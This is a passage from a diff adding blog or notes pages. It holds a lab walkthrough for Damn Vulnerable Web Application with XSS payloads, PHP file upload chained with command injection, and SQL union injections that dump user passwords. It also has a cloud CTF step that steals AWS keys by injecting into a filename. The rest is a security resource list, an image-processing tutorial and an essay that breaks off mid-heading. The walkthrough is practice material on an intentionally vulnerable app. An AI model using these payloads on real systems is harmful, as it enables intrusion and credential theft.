+<p>Some level of filtering has been done in both input blocks, but the name tag has a weaker level of filtering.</p>
+<pre><code class="language-php">// Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = str_replace( '&lt;script&gt;', '', $name );
+</code></pre>
+<p>The strip_tags function is strong and removes all html, php tags. We can target the weaker <code>name</code> input field, but, the problem is the <code>name</code> field takes only 10 characters. To increase this number,</p>
+<ul>
+<li>Ctrl + Shift + i</li>
+<li>Find the input tag of the <code>name</code> field in the console,</li>
+<li>Note, that it has a maxlength value set to 10, increase it to 50.</li>
+<li>Attack the <code>name</code> field.</li>
+</ul>
+<p><strong>Attack :</strong> <code>&lt;SCRIPT&gt;alert("hacked")&lt;/SCRIPT&gt;</code></p>
+<h2 id="high-4"><a class="header" href="#high-4">High</a></h2>
+<p>It is the same case as medium, but this time, there is too much focus on the script tag, so try img tags.
+<strong>Attack :</strong> <code>&lt;img src=x onerror=alert("hacked")&gt;</code> in Name</p>
+<h1 id="file-upload"><a class="header" href="#file-upload">File Upload</a></h1>
+<h2 id="low-5"><a class="header" href="#low-5">Low</a></h2>
+<ul>
+<li>Create the following php file</li>
+<li>Upload it</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+echo getenv("PATH")
+?&gt;
+</code></pre>
+<ul>
+<li>Access the file.</li>
+</ul>
+<h2 id="medium-4"><a class="header" href="#medium-4">Medium</a></h2>
+<ul>
+<li>Create the php file</li>
+<li>Save it as .png file</li>
+<li>upload it</li>
+<li>go to command injection</li>
+<li><code>127.0.0.1 &amp; copy ..\..\hackable\uploads\uploadmed.png ..\..\hackable\uploads\uploadmed.php</code></li>
+<li>now go back to uploads and access the file.</li>
+</ul>
+<h2 id="high-5"><a class="header" href="#high-5">High</a></h2>
+<ul>
+<li>The php file looks like</li>
+</ul>
+<pre><code class="language-php">GIF98
+&lt;?php
+echo getenv('PATH')
+?&gt;
+</code></pre>
+<ul>
+<li>Save it as .jpeg file</li>
+<li>Upload it</li>
+<li>go to command injection</li>
+<li><code>127.0.0.1|copy ..\..\hackable\uploads\uploadhigh.jpeg ..\..\hackable\uploads\uploadhigh.php</code></li>
+<li>now go back to uploads and access the file.</li>
+</ul>
+<h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
+<h2 id="low-6"><a class="header" href="#low-6">Low</a></h2>
+<p><strong>Attack :</strong> %' or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
+(or)
+%' or 1=1 union select null,version()#</p>
+<h2 id="medium-5"><a class="header" href="#medium-5">Medium</a></h2>
+<p><strong>Attack :</strong> 1 or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users
+(or)
+1 or 1=1 union select null,version()</p>
+<h2 id="high-6"><a class="header" href="#high-6">High</a></h2>
+<ul>
+<li>Click on <code>Click here to change ID</code>
+<strong>Attack :</strong> %' or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
+(or)
+%' or 1=1 union select null,version()#</li>
+</ul>
+<h1 id="csp-bypass"><a class="header" href="#csp-bypass">CSP Bypass</a></h1>
+<h2 id="low-7"><a class="header" href="#low-7">Low</a></h2>
+<ul>
+<li>go to hastebin</li>
+<li>make a file with contents</li>
+</ul>
+<pre><code class="language-js">alert(document.cookie);
+</code></pre>
+<ul>
+<li>Save and go to <code>just text</code></li>
+<li>Paste the link in the input field and click go.</li>
+</ul>
+<h1 id="aws-cloud-attack-defense-command-injection"><a class="header" href="#aws-cloud-attack-defense-command-injection">AWS Cloud Attack Defense Command Injection</a></h1>
+<ul>
+<li>Upload the file</li>
+<li>Switch on proxy</li>
+<li>Catch in burpsuite</li>
+<li>Right click and send to repeater</li>
+<li>add printenv to the end of the Filename</li>
+<li>Collect the following from response
+<ul>
+<li>SESSION TOKEN</li>
+<li>SECRET_ACCESS_KEY</li>
+<li>ACCESS_KEY_ID</li>
+</ul>
+</li>
+<li>Export them in the terminal in the same order</li>
+<li>Run the following commands</li>
+</ul>
+<pre><code class="language-sh">aws s3 ls s3://temporary-public-image-store
+aws s3 cp s3://temporary-public-image-store/flag.txt .
+cat flag.txt
+</code></pre>
+<h1 id="open-ssl"><a class="header" href="#open-ssl">Open SSL</a></h1>
+<ul>
+<li>Install from https://slproweb.com/products/Win32OpenSSL.html 5MB File</li>
+</ul>
+<p>ENCRYPTION:
+<code>openssl enc -salt -aes-256-cbc -in file.txt -out enc.txt</code></p>
+<p><code>openssl enc -d -aes-256-cbc -in enc.txt -out dec.txt</code></p>
+<p>HASH:
+<code>openssl dgst -sha256 file.txt</code></p>
+<p><code>openssl dgst -sha256 file.txt &gt; hash.txt</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-security-resources"><a class="header" href="#cyber-security-resources">Cyber Security Resources</a></h1>
+<h1 id="date-2023-03-04-2"><a class="header" href="#date-2023-03-04-2"><small style="font-weight:normal; font-size:0.7em;">Date: 2023-03-04</small></a></h1>
+<hr />
+<p>I am glad to find so many people in my college being interested in Cyber Security. I would like to assure you that you have come to the right place to start your journey in this field. Let's cut the introduction short and get to the point, I hope we'll get to know each other better as time progresses. This WhatsApp group is to help you learn and get better in your domain(s) of interest in Cyber Security.</p>
+<p>So, what are these domains I am talking about?</p>
+<h2 id="malware-analysis"><a class="header" href="#malware-analysis">Malware Analysis</a></h2>
+<pre><code>Malware analysis is the process of understanding the behavior and purpose of a suspicious file or URL. The output of the analysis aids in the detection and mitigation of the potential threat.
+</code></pre>
+<h3 id="resources-"><a class="header" href="#resources-">Resources :</a></h3>
+<p>Practical Malware Analysis Book</p>
+<p>https://www.youtube.com/watch?v=uHhKkLwT4Mk&amp;list=PLBf0hzazHTGMSlOI2HZGc08ePwut6A2Io</p>
+<p>https://www.youtube.com/c/JohnHammond010</p>
+<p>https://www.youtube.com/c/MalwareAnalysisForHedgehogs</p>
+<p>https://www.first.org/global/sigs/malware/resources/</p>
+<p>https://www.sans.org/blog/how-you-can-start-learning-malware-analysis/</p>
+<h2 id="digital-forensics-and-incident-response"><a class="header" href="#digital-forensics-and-incident-response">Digital Forensics and Incident Response</a></h2>
+<pre><code>Digital forensics and incident response (DFIR) is a specialized field focused on identifying, remediating, and investigating cyber security incidents. Digital forensics includes collecting, preserving, and analyzing forensic evidence to paint a full, detailed picture of events.
+</code></pre>
+<h3 id="resources--1"><a class="header" href="#resources--1">Resources :</a></h3>
+<p>https://dfirdiva.com/getting-into-dfir/</p>
+<p>https://www.youtube.com/watch?v=-IUJnDs6rbE</p>
+<p>https://www.youtube.com/c/SANSDigitalForensics/playlists</p>
+<p>https://www.youtube.com/c/DFIRScience</p>
+<p>https://itmasters.edu.au/free-short-course-information-security-incident-handling/</p>
+<p>https://www.youtube.com/channel/UCjFuM88y9_awcgxsek85YyQ</p>
+<h3 id="practice-"><a class="header" href="#practice-">Practice :</a></h3>
+<p>https://github.com/stuxnet999/MemLabs</p>
+<p>https://www.netresec.com/?page=PcapFiles</p>
+<p>https://www.malware-traffic-analysis.net/</p>
+<h2 id="reverse-engineering"><a class="header" href="#reverse-engineering">Reverse Engineering</a></h2>
+<pre><code>Reverse engineering covers a broad range of areas, including decompiling and disassembling of executable files and libraries, and analysis of system data. In the field of computer security, reverse engineering is used to study malware activity and create tools to neutralize it.
+</code></pre>
+<h3 id="resources--2"><a class="header" href="#resources--2">Resources :</a></h3>
+<p>The Reversing Secrets of a Reverse Engineer book is pretty good, especially the 3 indexes in the back of the book.</p>
+<p>https://github.com/OpenToAllCTF/REsources</p>
+<p>https://www.youtube.com/playlist?list=PL_tws4AXg7auglkFo6ZRoWGXnWL0FHAEi</p>
+<p>https://www.youtube.com/watch?v=a2EkORFcSZo</p>
+<p>https://www.youtube.com/watch?v=fnYp2DN_XZc</p>
+<h3 id="practice--1"><a class="header" href="#practice--1">Practice :</a></h3>
+<p>https://crackmes.one/</p>
+<h2 id="binary-exploitation"><a class="header" href="#binary-exploitation">Binary Exploitation</a></h2>
+<pre><code>Binary exploitation is the process of subverting a compiled application such that it violates some trust boundary in a way that is advantageous to you, the attacker. In this module we are going to focus on memory corruption.
+</code></pre>
+<h3 id="resources--3"><a class="header" href="#resources--3">Resources :</a></h3>
+<p>https://www.hoppersroppers.org/roadmap/training/pwning.html</p>
+<p>https://www.youtube.com/channel/UCgTNupxATBfWmfehv21ym-g</p>
+<p>https://ir0nstone.gitbook.io/notes/types/stack/introduction</p>
+<p>https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w</p>
+<p>https://corruptedprotocol.medium.com/</p>
+<h3 id="practice--2"><a class="header" href="#practice--2">Practice :</a></h3>
+<p>https://ropemporium.com/</p>
+<p>https://dojo.pwn.college/</p>
+<h2 id="security-operations-center"><a class="header" href="#security-operations-center">Security Operations Center</a></h2>
+<pre><code>A security operations center — commonly referred to as a SOC — is a team that continuously monitors and analyzes the security procedures of an organization. It also defends against security breaches and actively isolates and mitigates security risks
+</code></pre>
+<h3 id="resources--4"><a class="header" href="#resources--4">Resources :</a></h3>
+<p>https://www.youtube.com/channel/UCfcDMqKt72afteeXBk99cmg/playlists</p>
+<p>https://www.youtube.com/c/AnandGuruSOCExperts/playlists</p>
+<h3 id="practice--3"><a class="header" href="#practice--3">Practice :</a></h3>
+<p>https://letsdefend.io/</p>
+<h2 id="web-application-pentesting"><a class="header" href="#web-application-pentesting">Web Application Pentesting</a></h2>
+<pre><code>Web application penetration testing involves a methodological series of steps aimed at gathering information about the target system, finding vulnerabilities or faults in them, researching for exploits that will succeed against those faults or vulnerabilities and compromise the web application.
+</code></pre>
+<h3 id="resources--5"><a class="header" href="#resources--5">Resources :</a></h3>
+<p>Book : The Web Application Hacker's Handbook</p>
+<p>https://www.youtube.com/watch?v=2_lswM1S264</p>
+<p>https://owasp-academy.teachable.com/</p>
+<h3 id="practice--4"><a class="header" href="#practice--4">Practice :</a></h3>
+<p>https://portswigger.net/web-security (Portswigger Labs)
+Damn Vulnerable Web Application</p>
+<p>OWASP Juice Shop</p>
+<p>OWASP Broken Web Apps</p>
+<h2 id="cryptography"><a class="header" href="#cryptography">Cryptography</a></h2>
+<pre><code>Cryptography is the study of secure communications techniques that allow only the sender and intended recipient of a message to view its contents. The term is derived from the Greek word kryptos, which means hidden.
+</code></pre>
+<h3 id="resources--6"><a class="header" href="#resources--6">Resources :</a></h3>
+<p>https://www.youtube.com/playlist?list=PL1H1sBF1VAKU05UWhDDwl38CV4CIk7RLJ</p>
+<p>https://www.youtube.com/playlist?list=PL60F3F917709C7DD5</p>
+<p>Important Algorithms :</p>
+<ul>
+<li>AES</li>
+<li>RSA</li>
+<li>DES</li>
+<li>Diffie Hellman</li>
+<li>ECC</li>
+</ul>
+<h3 id="practice--5"><a class="header" href="#practice--5">Practice :</a></h3>
+<p>https://cryptohack.org/</p>
+<h2 id="other-domains-in-cyber-security-include-"><a class="header" href="#other-domains-in-cyber-security-include-">Other Domains in Cyber Security Include :</a></h2>
+<ul>
+<li>Network Security</li>
+<li>Hardware Security</li>
+<li>Threat Intelligence</li>
+<li>Social Engineering</li>
+<li>OSINT</li>
+</ul>
+<h2 id="basics"><a class="header" href="#basics">BASICS</a></h2>
+<p><em>Python Basics :</em> https://www.youtube.com/watch?v=8DvywoWv6fI</p>
+<p><em>Linux -</em> https://www.youtube.com/watch?v=VbEx7B_PTOE&amp;list=PLIhvC56v63IJIujb5cyE13oLuyORZpdkL</p>
+<p><em>Bash Scripting-</em> https://www.youtube.com/watch?v=LTuuMtQR1uQ&amp;list=PLBf0hzazHTGMJzHon4YXGscxUvsFpxrZT</p>
+<p>https://overthewire.org/wargames/bandit/</p>
+<p><em>Web :</em> https://www.youtube.com/c/HackerSploit/search?query=webapp%20pentesting</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="intro-to-image-manipulation"><a class="header" href="#intro-to-image-manipulation">Intro to Image Manipulation</a></h1>
+<h1 id="date-2021-06-01"><a class="header" href="#date-2021-06-01"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-06-01</small></a></h1>
+<hr />
+<p>What are Images? What form do they exist in?</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ybfjlwDfxtFvQpYNw_9Fcw.jpeg" alt="" /></p>
+<p>Note: This series assumes that you have a intermediate level understanding of Python, and a basic level understanding Linear Algebra (esp. Matrices and Matrix Operations) and Calculus.</p>
+<p>Images are everywhere, starting from X-Rays used to save people’s physical lives to memes that are used to save their mental lives.</p>
+<p>Being blind in this beautiful world is a very depressing thing indeed, so why let the computers miss out on the fun ?</p>
+<p>One might argue that, that’s why cameras exist, but the thing about it is, cameras only help us capture the image data and put it into a frame or a computer. You can view it, but it means nothing to the computer. To a computer, all images are simply matrices.</p>
+<p>If you keep zoom in to an image, you might start seeing squares all over your image. These squares are pixels. Each Pixel has 3 channels.</p>
+<p>In a R.G.B image, the 3 channels are [Red, Blue, Green]. The colour of the pixel is a mixture of the red, blue and green channels.</p>
+<p>If the Red Channel has a value of 1 and the other 2 channels have a value of 0. Then the pixel will be Red in colour. Most computers have pixel colour values ranging from 0 to 255(uint8). Some might have them range from 0 to 65535(uint16).</p>
+<blockquote>
+<p>White — [255,255,255]
+Black — [0,0,0]
+Red — [255,0,0]
+Green — [0,255,0]
+Blue — [0,0,255]</p>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/3840/1*dYkCOoHM8mmOQQaX6zh_BQ.jpeg" alt="This is the image we’ll work on! — PC Suraj Nukala" /><em>This is the image we’ll work on! — PC Suraj Nukala</em></p>
+<p>We start by importing the required packages…</p>
+<pre><code>import matplotlib.pyplot as plt
+import numpy as np
+</code></pre>
+<p>We read the image using the ‘pyplot’ inbuilt function,</p>
+<pre><code>img = plt.imread(‘asuma.jpg’)
+</code></pre>
+<p>Now, the img variable has the data of the image, ‘asuma.jpg’</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*oyq8CYhrQDam-EiH3ni6Dw.png" alt="This is a numpy array, of the first 5 rows and columns in the image." /><em>This is a numpy array, of the first 5 rows and columns in the image.</em></p>
+<p>Numpy is a Python Library that helps one work with Linear Algebra, Matrices and Fourier Transforms. It was created in 2005 as an open-source project by Travis Oliphant. It remains one of the standard libraries in the field of Data Science.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*02XjuT2MV7L5ey5dudKA0w.png" alt="The Image size is 1080 x 1920, but what is the 3?, it is the number of channels." /><em>The Image size is 1080 x 1920, but what is the 3?, it is the number of channels.</em></p>
+<p>Let us look at the pixel on the 1000th row and 500th column, and check if it is grey in colour.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*rSyjY4ZO1PV-A1Ccdy0g_g.png" alt="We were right! [rows, columns, channels]" /><em>We were right! [rows, columns, channels]</em></p>
+<p>Let’s now cover the dude’s face with a big blue square. The face region spans from 0th to 500th rows and 1150th to 1650th columns.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*3ZnD60xV-F0JPlXuKNj_Ow.png" alt="" /></p>
+<p>Lets, create our own image, and give colours to it,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*vnKmiYix-ApMJ5X614O-Dw.png" alt="" /></p>
+<p>Let’s extract each channel of the image we created,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*U_C3Zr3Yql-UcFICzSw1bw.png" alt="" /></p>
+<p>Look at how the Red channel has only the Red part brightened and similarly for the other 2 channels, manipulating these 3 channels is crucial for efficient image processing.</p>
+<p>There are many computer vision libraries, some of the best of skimage and opencv-python. SciPy is also a good alternative.</p>
+<p>SK-Image does not allow video-processing in realtime, but opencv does. OpenCV is also faster than skimage, but has lesser pre-implemented algorithms. Pillow is the standard library for image processing in python.</p>
+<p>Thank you, do leave your feedback in the comments.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="evolution-of-the-society--what-next"><a class="header" href="#evolution-of-the-society--what-next">Evolution of the Society — What Next?</a></h1>
+<h1 id="date-2021-08-20"><a class="header" href="#date-2021-08-20"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-08-20</small></a></h1>
+<hr />
+<p>Trying to figure out what is going to happen in the future</p>
+<p><strong>Motivation</strong></p>
+<p>The Society is evolving at such a great pace, that lots of people are losing jobs and even more people are roaming a world with skills that need slight tweaks.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*TzcZV4hz_jJ961qHVdT0HQ.jpeg" alt="" /></p>
+<p>I wouldn’t call any skill that has been achieved through long hours of training and practice as waste.</p>
+<p>Many nights I have spent trying to get into scope the entire field of technology and where everything is going.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*9axZhx3RS7J8dFX02qzFpQ.jpeg" alt="" /></p>
+<p>I see a lot of people haphazardly try to learn things like Python, Data Science, AI and all these. Yes, AI is going to be a big thing in the future, but, I can’t imagine someone, who can make AI applications, give it a cool interface, deploy it on different platforms, connect the platform to the world all alone in one lifetime.</p>
+<p>Team work is the only way out.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ajz6xQxxZm5BcV7LLdpBlA.jpeg" alt="" /></p>
+<p>One cannot learn everything from building <strong>Autonomous Vehicles</strong> to **Genome Sequencing, **from <strong>Unmanned Aerial Vehicles</strong> to <strong>Quantum Computing</strong>.</p>
+<p><strong>Respected Engineers of the world, please do not be narrow minded.</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*yRem63Sn5VzWDYp6o5ys8A.jpeg" alt="" /></p>
+<p>Back when Electricity was the big thing, people didn’t know AI was coming. <strong>Now AI is the big thing…we do not know what is coming.</strong></p>
+<p>Lets talk data,</p>
+<p><strong>A Use case has to be designed — Data has to be collected — Stored Efficiently for Retrieval — Analyzed Efficiently — The Solutions have to be used appropriately.</strong></p>
+<p>The amounts of data will get massive, so massive that we might have to keep looking for better and better ways to store and process it.</p>
+<p>So, what do we have here,</p>
+<p><strong>Scaling Memory :</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*RleR2eMU7tRsacczhxEJqw.jpeg" alt="" /></p>
+<p>Memory is the bottleneck of almost all systems, it requires energy to store and retrieve it.</p>
+<p>The human brain is said to have 2.5 Million GB of RAM. We aren’t even close to replicating it. There are lots of research scopes in the data storage field.</p>
+<p><strong>Processing :</strong></p>
+<p><strong>Quantum Computing :</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/8000/1*6f3u9znjSsxWUQpA3Glosw.jpeg" alt="" /></p>
+<p>Quantum Computing is the next big thing you might say, but I’ll give you one better, as Quantum Computing open new and bigger doors for humanity, we will be needing more and more people to enter those doors and explore.</p>
+<p>Protein Folding, Drug Discovery and complex Bio-Informatics tasks might find answers, but, who is going to explore?</p>
+<p>Here are some more applications :</p>
+<ul>
+<li>
+<p>Cybersecurity.</p>
+</li>
+<li>
+<p>Drug Development.</p>
+</li>
+<li>
+<p>Financial Modeling.</p>
+</li>
+<li>
+<p>Better Batteries.</p>
+</li>
+<li>
+<p>Cleaner Fertilization.</p>
+</li>
+<li>
+<p>Traffic Optimization.</p>
+</li>
+<li>
+<p>Weather Forecasting and Climate Change.</p>
+</li>
+<li>
+<p>Artificial Intelligence.</p>
+</li>
+</ul>
+<p>But Quantum Computing will take time, at least 50 years, and it is hard for me to think that far ahead, and **don’t be fooled by the myth — Quantum Computers will replace Classical Computers. **Thing is Classical Computers have some unique properties that Quantum Computers might never be able to achieve.</p>
+<p>The applications for Quantum Computing is vast alright I have barely scratched the surface, but, <strong>vast is the scale we need to start thinking in</strong> to look at the future of opportunities.</p>
+<p><strong>High Performance Computing :</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/4200/1*z9yaUoTdV6vQEHNb0m66KA.jpeg" alt="" /></p>
+<p>Keep developing Classical Computers if you want to leverage the power of quantum computing to the maximum.</p>
+<p>As of now, and for quite a while, they will be the ones that will be the ones that will be processing our data as quantum computers are just not good enough.</p>
+<p>Just because one has all the computing power in the world doesn’t mean the same person has all the time. We need to keep making our algorithms more and more optimized, and optimizing algorithms is well, not our best skill.</p>
+<p>You can just take a deep dive into <strong>Data Structures and Algorithms</strong> and start drowning in the sheer amount of questions that remain difficult or presumably impossible in algorithms.</p>
+<blockquote>
+<p>What will happen if an AI is able to predict the growth or fall of a particular stock?
+If the news is made public, people will buy the stock, increasing its value, and if it predicts a fall, people will sell all or most of their stocks and make the value drop, now who is controlling the market? The AI or the People?</p>
+</blockquote>
+<h3 id="data-is-getting-massive-how-where-is-all-this-data-coming-from"><a class="header" href="#data-is-getting-massive-how-where-is-all-this-data-coming-from"><strong>Data is getting massive.. how? Where is all this data coming from?</strong></a></h3>
+<p><strong>Internet Of Things :</strong></p>
+<p>All this data comes from devices that are connected to the cloud. These devices will mostly include, “Things”. You know where I am getting at, we have all watched I-Robot and Terminator.</p>
+<p><strong>IoT and Smart Things</strong> also have a huge amount of importance in the future.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*C8aa9V1p8csLa1fXrJ3wSg.jpeg" alt="" /></p>
+<p>Development of Smart devices require people who have a cross-over experience in different field. (Its <strong>Internet</strong> of <strong>Things</strong>). We need people to design such devices, sparking a need for good designers.</p>
+<p>Developing such devices isn’t an easy task either, even small mistakes can be super hard to fix, and mistakes are easy to make given the amount of complexity.</p>
+<p>After deploying them we need to allow human communication with these devices which requires people with good level of knowledge in <strong>Human Computer Interaction</strong>.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2500/1*BxONoxt-eJqdqMqnk_bLmQ.jpeg" alt="" /></p>
+<p>The Field of HCI is rapidly advancing with <strong>AR, VR and MR</strong> becoming, common talk.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*iyBZxIwTSkKVFTiomCquyw.png" alt="" /></p>
+<p>Apart from this, we also have a field called** Brain Computer Interface** which is slowly pacing forward, but has a promising future.</p>
+<p>This field has varied applications from <strong>Gaming</strong> to <strong>Healthcare</strong>.</p>
+<p>There are many more interesting types of HCI tech, that I would like to discuss, but I will let you find that out for yourself. Now, back to IoT.</p>
+<p>IoT devices require power to run, talking of power, we need to figure out ways to emit cleaner, and scalable sources of power.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*pZDRLh0DFYxwAbTfpkWPZA.jpeg" alt="" /></p>
+<p>Lithium unlike Silicon is not super abundant. Batteries are made from that stuff, research says, <strong>proper e-waste management is necessary to maintain sustenance.</strong></p>
+<p>Human race, cannot imagine scalable and autonomous Electric Vehicles, without <strong>proper urban planning and better batteries.</strong></p>
+<p><img src="https://cdn-images-1.medium.com/max/2400/1*i9Gwgo0t8IMcICt3j1Kmlw.jpeg" alt="" /></p>
+<p>Luckily, it isn’t impossible, we can recycle 97% of the lithium, <strong>but will we?</strong></p>
+<p><strong>Material Science, Applied Chemistry, Mining industries ain’t going to fall anytime soon</strong>, but they do need to adapt to the coming change. I will try emphasizing on these changes in later blogs if possible.</p>
+<p>Back to IoT,</p>
+<p>We do not have enough standards to govern these devices, so new devices might fail to be compatible with old ones.</p>
+<p>Not just development, but <strong>scaling the number of IoT devices that can be connected under a single hub is also limited.</strong></p>
+<p>The more and more you connect with the world, advanced technologies in <strong>Computer Networking become more and more necessary.</strong> Networking skills are in good demand. They are actually going to face super high demands in the future, a little research will help you understand better.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ZWxi15rbv_-vrbRfNlLzlA.jpeg" alt="" /></p>
+<p>Alas with all these networks, humans have a few bad people, and WILL try to hack into these networks and there is an ever growing importance for the **Cyber Security field. **I am not even going to go there since, what ever you touch in the field has a necessity somewhere.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*w5OIaKB_Rr396Qt1frBL_g.png" alt="" /></p>
+<p>Warren Buffet has estimated <strong>cyber threats to be one of the biggest threats to mankind, even higher than nuclear weapons</strong>. We need people who can guard us and our data from these things.</p>
+<p><strong>How can there be so much of something and still have high value?</strong></p>
+<p>Lots of data, lots and lots of it? Where is the value? We need to keep creating value from this data. Data we have been emitting like rays of the sun since the first tablet was inscribed on, but, garbage in = garbage out.</p>
+<p>As data gets more and more varied, <strong>we will need people who can understand it, and help clean it</strong>. Not data scientists, don’t get me wrong.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*QnA5X1xhz5c19PwATznclg.png" alt="" /></p>
+<p><strong>When we say data scientists, we say it like there is one person doing everything from cleaning to deployment.</strong> Though, there is a high possibility that this is the case in small companies, in the future, even a startup will start looking for people to clean and analyze the data they collect, this is necessary because the industry is evolving.</p>
+<blockquote>
+<h1 id="what-we-need-in-packets-today-we-might-need-in-containers-tomorrow"><a class="header" href="#what-we-need-in-packets-today-we-might-need-in-containers-tomorrow">What we need in packets today, we might need in containers tomorrow.</a></h1>
+</blockquote>
+<p>To understand an analyze the data,** domain knowledge is equally important.** A person who know nothing about cars cannot extract key details regarding the manufacturing of cars in a factory. A person who knows nothing about finance, cannot efficiently analyze and extract insights from even terabytes of stock-market data.</p>
+<p>So prospective data scientists out there, beware, maybe right now, you are managing with common sense and some googling, but it will only get tougher and tougher as your data gets deeply intertwined with the domain.</p>
+<p>As we advance more as a society, we will start emitting more data, and in turn we require to collect all this data.Where can more data be extracted from in a system. This is another question people will start asking!</p>
+<p>If you want to be a data scientist at Tesla, learn as much about cars as data science. You get the point.</p>
+<h3 id="urbanization-and-modernization-"><a class="header" href="#urbanization-and-modernization-">Urbanization and Modernization :</a></h3>
+<p><strong>Smart cities, Urban Planning, Battling Climate change, Underwater Structures</strong>, these are some big words we hear every now and then.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2800/1*YXWh43cBLW241lkP3d7tWA.jpeg" alt="" /></p>
+<p>There will be a need for a civil engineer and a mechanical engineer in almost all <strong>renewable energy projects</strong>, governments are starting to see the need for it.</p>
+<p><strong>Environmental Engineering</strong> have great responsibilities to save the future.</p>
+<p>Singapore is pouring its millions in Civil Engineering, it faces the <strong>Urban Heat Island Effect.</strong></p>
+<p><strong>Urban Planning</strong>, also looks like a promising career, and the scope has been predicted to rise up to 11% by 2028.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*2AFjEk6z1NejuonBDyotmA.jpeg" alt="" /></p>
+<p>But, unlike other fields this field has <strong>grown rather slowly, but will grow, with new ground-breaking research in the field</strong>.</p>
+<p>As the human community grows, we might eventually run out of space. A well expected thing. We are also combating climate change at the same time. People have started planning for underwater structures.</p>
+<p>Humans will always need a roof over their heads. <strong>No matter what.</strong></p>
+<p>We as a community should also remember that <strong>Mr.Musk isn’t guaranteeing us Mars in the near future</strong>, and so, we need to take care of earth and as usual we look at new technologies to do that for us.</p>
+<p><strong>The construction industry is also going to start using cyber-physical systems in construction.</strong></p>
+<p>Humans are just not required in these places anymore, but be glad about it. No more toiling of human labor in the construction sites. We can build unimaginable things, if we start using robots for construction, since, right now, “Built by Humans” is always a huge limitation, but, again how these systems work, <strong>how to plan and design them to work in the construction site is another challenge we must face.</strong></p>
+<blockquote>
+<p>We need people to plan the new cities that arise from these changes. Wait a minute, what about the current houses? Current malls?
+When brick and cement was ready to use in houses. The term “Cavemen” was introduced.
+After going to mars, we ain’t going to sleep on space rock! Musk take note of that.</p>
+</blockquote>
+<p>Many governments are planning on <strong>conversion of their cities into smart cities</strong>. We need people who can plan them to be **sustainable. **Where would we have been if our ancestors did not put in their best efforts at planning these things. <strong>They built our cities for telephone lines and bullock carts. We are talking Autonomous cars and Internet. Mankind needs to rebuild.</strong></p>
+<p>We cannot have telephone towers everywhere. Who is optimizing this? Who does the job of finding out where there is the need for a tower?</p>
+<p>And yet again we stumble upon, another important field.</p>
+<p><strong>5G Technology</strong>, it has the ability to change everything, believe it or not, we might just connect opposite ends of the world in seconds or maybe milliseconds. We want everything to connect to the internet!</p>
+<p>I won’t be able to do justice to 5G in this post, but read this blog that clearly explains most possible use cases. <a href="https://www.rfpage.com/applications-5g-technology/">Blog</a></p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*dQ33tCVhG77bxIY-LCW-Og.jpeg" alt="" /></p>
+<h3 id="healthcare-"><a class="header" href="#healthcare-"><strong>Healthcare :</strong></a></h3>
+<p>Bio Technology, is another field that is about to blast off, I do not have to discuss about how we are finding new viruses everyday, but as connectivity increases, these viruses are getting transmitted at breathtaking paces.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*575yJejuZduzb_7lr17G9w.jpeg" alt="" /></p>
+<p>COVID19 hit us when we were sleeping, but now we are awake and we have started responding by trying to find various computational methods for modelling drugs, extracting data from genomes, and trying to edit them.</p>
+<ul>
+<li>
+<p>Gene discovery and diagnosis of rare mono-genic disorders.</p>
+</li>
+<li>
+<p>Identification and diagnosis of genetic factors contributing to common disease.</p>
+</li>
+<li>
+<p>Pharmacogenetics and targeted therapy.</p>
+</li>
+<li>
+<p>Prenatal diagnosis and testing.</p>
+</li>
+<li>
+<p>Infectious diseases.</p>
+</li>
+</ul>
+<p><strong>The Healthcare industry is generating Exabytes of data, and processing all of it, is well a huge task at hand.</strong> Moreover, medicine and a proper treatment for cancer isn’t that far away.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*udCMFrp983zTxOQAUvgnyA.jpeg" alt="" /></p>
+<p>Doctors will have to give a huge amount of time trying to understand and start using efficiently the large amount of tools given to them. It is true that we will start making robots for surgeries, that are super accurate and have greater chances of successes, but, there is no way a human is going to feel better mentally unless a doctor looks at his card and goes,</p>
+<p>“You are fine now, Mr.Avtar Singh, your cancer is gone!”</p>
+<p><strong>So, docs stick to your white coats.</strong></p>
+<h3 id="law-"><a class="header" href="#law-"><strong>Law :</strong></a></h3>
